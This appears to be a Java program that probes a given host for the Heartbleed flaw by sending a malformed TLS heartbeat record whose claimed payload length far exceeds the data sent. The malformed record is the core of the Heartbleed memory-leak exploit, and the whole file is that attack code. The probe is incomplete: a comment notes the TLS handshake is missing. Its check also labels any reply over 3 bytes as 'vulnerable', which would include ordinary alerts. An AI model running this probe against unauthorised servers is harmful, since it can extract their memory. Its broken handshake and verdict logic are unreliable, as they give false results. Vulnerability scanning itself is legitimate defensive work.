import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;

public class HeartbleedTester {

    private static byte[] createHeartbeat(int version) {
        byte[] hb;
        switch (version) {
            case 1:
                hb = new byte[]{0x18, 0x03, 0x01, 0x00, 0x03, 0x01, 0x40, 0x00};
                break;
            case 2:
                hb = new byte[]{0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00};
                break;
            case 3:
                hb = new byte[]{0x18, 0x03, 0x03, 0x00, 0x03, 0x01, 0x40, 0x00};
                break;
            default:
                throw new IllegalArgumentException("Unsupported version: " + version);
        }
        return hb;
    }

    public static void testHeartbleed(String host, int port) throws IOException {
        try (Socket socket = new Socket(host, port)) {
            OutputStream out = socket.getOutputStream();
            InputStream in = socket.getInputStream();

            // 여기에 TLS Handshake를 수행하는 코드 추가 필요

            // Heartbeat 메시지 전송
            byte[] heartbeat = createHeartbeat(2); // TLS 1.1 예제
            out.write(heartbeat);

            // 서버로부터의 응답 수신 및 분석
            byte[] response = new byte[1024];
            int bytesRead = in.read(response);
            if (bytesRead > 3) {
                System.out.println("WARNING: Server returned more data than it should - server is vulnerable!");
            } else {
                System.out.println("Server processed malformed heartbeat, but did not return any extra data.");
            }
        }
    }

    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("Usage: HeartbleedTester <host> [port]");
            return;
        }

        String host = args[0];
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 443;

        try {
            testHeartbleed(host, port);
        } catch (IOException e) {
            System.out.println("Error testing for Heartbleed: " + e.getMessage());
        }
    }
}
